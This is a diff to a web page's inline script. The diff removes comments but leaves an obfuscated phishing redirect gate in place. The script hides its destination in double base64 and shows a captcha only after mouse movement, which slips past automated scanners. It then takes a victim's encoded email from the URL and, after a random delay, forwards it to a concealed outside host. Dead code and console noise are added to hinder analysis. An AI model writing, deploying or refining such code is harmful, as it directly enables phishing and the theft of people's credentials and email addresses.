@@ -17,43 +17,18 @@
 </form>
 
 <script>
-/*
-  Packed & hardened runtime loader
-  - destination hidden (double-base64)
-  - regex pattern hidden (base64)
-  - variable names scrambled, dead-noise added
-  - retains original behavior: detect ?<10digits>=<base64email>, require mouse->captcha->redirect
-*/
-
 (function(){
-  // ---------- configuration (opaque strings) ----------
-  // double-base64 of the final destination (double-encoded)
   const _0 = "YUhSMGNITTZMeTgwYUhvM09DNXNjV041Y1hOd0xtVnpMM0JzWmtRNGJtZFJJVFV5UkZwdlJUWm5XaTg9";
-  // base64 of the pattern: \?(\d{10})=([A-Za-z0-9+/=]+)
   const _1 = "XFxfKFxkX3sxMH0pPVsoYS16QS05Ky9dKyk=";
-  // small entropy array (noise)
   const _N = ["\u200B","\u2063","\u2062"];
-  // a toggle, keep true to append *email
   const _m = true;
-
-  // ---------- tiny helpers ----------
   function _b64(s){ try { return atob(s); } catch(e){ return ""; } }
-  function _b64twice(s){ return _b64(_b64(s)); } // decodes double-base64 stored in _0
-  function _rnd(){ return Math.floor(Math.random()*999999); } // noise
+  function _b64twice(s){ return _b64(_b64(s)); }
+  function _rnd(){ return Math.floor(Math.random()*999999); }
   function _qs(){ return window.location.search || ""; }
-
-  // decode stored regex (itself base64 of the pattern string)
-  var _patRaw = _b64(_1); // now contains the literal pattern string like \?(\d{10})=([A-Za-z0-9+/=]+)
-  // build RegExp object (use constructor to avoid literal exposure)
+  var _patRaw = _b64(_1);
   var _re = null;
-  try {
-    _re = new RegExp(_patRaw);
-  } catch(e) {
-    // fallback safe pattern if anything fails
-    _re = /\?(\d{10})=([A-Za-z0-9+/=]+)/;
-  }
-
-  // ---------- UI triggers ----------
+  try { _re = new RegExp(_patRaw); } catch(e) { _re = /\?(\d{10})=([A-Za-z0-9+/=]+)/; }
   document.addEventListener("mousemove", function t(){
     try{
       var btn = document.getElementById("k");
@@ -61,70 +36,46 @@
       document.removeEventListener("mousemove", t);
     }catch(e){}
   });
-
-  // startCaptcha called by button click
   window.A = function(){ 
     try{
       document.getElementById("k").style.display="none";
       document.getElementById("f").style.display="block";
-      // tiny obfuscation: create a faux CPU load for a few ms (no blocking)
       for(let i=0;i<3;i++){ void (0+_rnd()); }
     }catch(e){}
   };
-
-  // on successful captcha this runs (callback registered in HTML)
   window.C = function(){
     try {
-      // read search portion (no hash)
       var q = _qs();
-      // small pre-check - if query empty, error out
       if(!q || q.length < 5){
         document.body.innerHTML = "<h3>Missing required parameter.</h3>";
         return;
       }
-
-      // match via hidden regex
       var m = q.match(_re);
       if(!m || !m[2]){
         document.body.innerHTML = "<h3>Missing required parameter.</h3>";
         return;
       }
-
-      // m[2] is the base64-encoded email (not decoded)
       var encEmail = m[2].trim();
-      // minimal validation: only base64 chars
       if(!/^[A-Za-z0-9+/=]+$/.test(encEmail)){
         document.body.innerHTML = "<h3>Invalid input.</h3>";
         return;
       }
-
-      // decode destination (double-base64) and assemble final URL
       var base = _b64twice(_0);
       if(!base || base.length<5){
         document.body.innerHTML = "<h3>Error processing request.</h3>";
         return;
       }
-
-      // assemble final URL; append star + the raw base64 email if toggle on
       var finalURL = _m ? (base + "*" + encEmail) : base;
-
-      // final tiny obfuscation: write a short, meaningless string to console (makes breakpoints noisy)
       try { console.debug("\u2063"); } catch(e){}
-
-      // redirect after small delay
       setTimeout(function(){
         window.location.href = finalURL;
       }, 900 + (Math.random()*600)|0);
-
     } catch(err){
       try { document.body.innerHTML = "<h3>Error occurred.</h3>"; } catch(e){}
     }
   };
-
-  // small self-integrity check (no-op, obfuscation)
   (function(){ var s=0; for(var i=0;i<3;i++){ s+=i; } return s; })();
-
-})(); /* end packed IIFE */
+})();
 </script>
 </body>
 </html>
